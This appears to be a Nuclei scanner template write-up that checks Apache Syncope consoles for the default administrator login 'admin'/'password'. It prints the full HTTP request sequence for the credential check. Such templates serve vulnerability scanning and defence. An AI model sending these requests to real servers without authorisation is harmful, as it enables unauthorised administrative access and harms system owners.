# Nuclei Template: Apache Syncope - Default Login
**Template ID:** apache-syncope-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`apache-syncope-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The Apache Syncope server is configured with default administrative credentials, allowing an attacker to perform unauthorized operations. This template verifies the use of the default username admin and password password.

## Steps to reproduce / Exploit Payload
```http
GET /syncope-console/login HTTP/1.1
Host: {{Hostname}}
Cookie: JSESSIONID=333333444444AAAA555555556666;

GET /syncope-console{{location}} HTTP/1.1
Host: {{Hostname}}

POST /syncope-console{{loginsubmit}} HTTP/1.1
Host: {{Hostname}}
Wicket-Ajax: true
Wicket-Ajax-BaseURL: {{location}}
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: {{RootURL}}

username={{username}}&password={{password}}&language=0&domain=0&p%3A%3Asubmit=1
```

## References
- https://github.com/apache/syncope
